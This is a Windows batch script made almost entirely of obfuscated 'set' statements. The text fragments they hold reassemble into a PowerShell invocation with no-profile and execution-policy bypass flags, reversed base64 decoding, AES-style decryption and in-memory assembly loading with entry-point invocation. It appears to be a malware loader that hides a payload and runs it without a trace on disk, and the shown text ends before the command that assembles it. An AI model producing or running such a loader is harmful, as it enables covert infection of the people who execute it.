@echo off
set "daApnPAhMx=he"
set "PgqqXZwxZj=st"
set "VfEygKENdF=py"
set "NHKoieFiIy=0\"
set "xoMcOKmtdE=we"
set "fgolwhqbto= C"
set "mWSCTLEvIp=:\"
set "cOlVSRoBBV=xe"
set "kOueAhyFVY=32"
set "ruJUgZmbFu=ow"
set "gifOmZOica=s\"
set "tfrfjvqggp=Wi"
set "RtGMFZSPQm=\W"
set "GpWTyGkDNV=po"
set "SOROKaiPNP=we"
set "oFZaLLPiAb=rS"
set "gkJByIvcjs=co"
set "pdPZgZWxer=nd"
set "WPvSvEmwZC=.e"
set "gGRjVnEHUJ=y "
set "AbdpwyMzEV= /"
set "khgnIaLmPQ=do"
set "CrjSRCJkTS=in"
set "QkVdZihTvT=Sy"
set "joALjgYaNh=em"
set "oijAFTECmY=Po"
set "DoKAWIjiOT=\v"
set "wjaQsmeAmH=ll"
set "ewbkdCjcyN=1."
set "BQCarQHOfk=ws"
set "dcczUWDvsR=rs"
set "UVeJEbXFIP=he"
set "sFpCVYPWEi=ll"
set "HDplbSkDSy=cd"
set "XrRDkNAYeO= %~dp0"
set "oHWmqbUMAZ=esMa"
set "tPhUCLPiMV=]::("
set "YhHcNdXpAe===')"
set "OfXoGXmazg=saBm"
set "pXWaPEfQoY=S46e"
set "RjdHiXJGfn=  $E"
set "rdFDZrXPmh='')("
set "cQynEjolFu=n ''"
set "bGwEzSuWZH=$OWa"
set "jPYWByydOy=embl"
set "WxgXzBDWvA=F'[-"
set "oyWOtYqyak=1] -"
set "cEZqcHLkNB=ddin"
set "KhSKqSDWCx=n ''"
set "fsJAAcLqjD=W.Pa"
set "fpWFkelCaZ=bu);"
set "XpMYRvCwZr=RmAx"
set "rtYevHSLmI=] -j"
set "eUKrhsDpUP=tsWi"
set "AFewtQoHPp=AUbu"
set "EYyagrFCmV=gX.T"
set "wOBOqcgmAr=OZ, "
set "fVrWKhVdcQ=$XAU"
set "lPfWlMXMLj=-nop"
set "lHBZfHnsfI=ye.D"
set "PjTdQPHYOb=rans"
set "VGnlfltLxf=tS46"
set "hfKqXGShWR=.-16"
set "wFBCWYPjAj= if "
set "HEdOtgMnfe=ke($"
set "byXKeyUOHs=ptor"
set "TYmbNthXoh=ne);"
set "EFHwjFRfAt=1..-"
set "JHvklJHskL=ewLi"
set "VBLKDmdiqM=comm"
set "rFQeBMcRoP=sion"
set "irvrhbVNhq=ti.T"
set "OqcfwvKKGI=oL'["
set "kURqweGIKa=ptog"
set "YKJstAwxJa=se()"
set "RuGfkQQAuU=.Len"
set "AkGHsDTkZv=bypa"
set "kpikSuzYxN=syd."
set "yyClTQebIW=ew-O"
set "cugLgvKoYd=fore"
set "DVWBjsXLTK=[]] "
set "pmGNNYIyaY=O.Me"
set "iZYAtyacxQ=Star"
set "FOgMojnAAn=::De"
set "UygUivbYio== [S"
set "eEpFWCUAab=HMqW"
set "ytkOyyuKXc=.Key"
set "oLCTZQGixt='[-1"
set "wUrasPSWSV=ptog"
set "rywifBVxqm=ect "
set "BGTbyYziyc=PiAy"
set "ocEIYqJTdr=ck($"
set "MPwDPEuykR=nirt"
set "ZxqdanswZm=ionM"
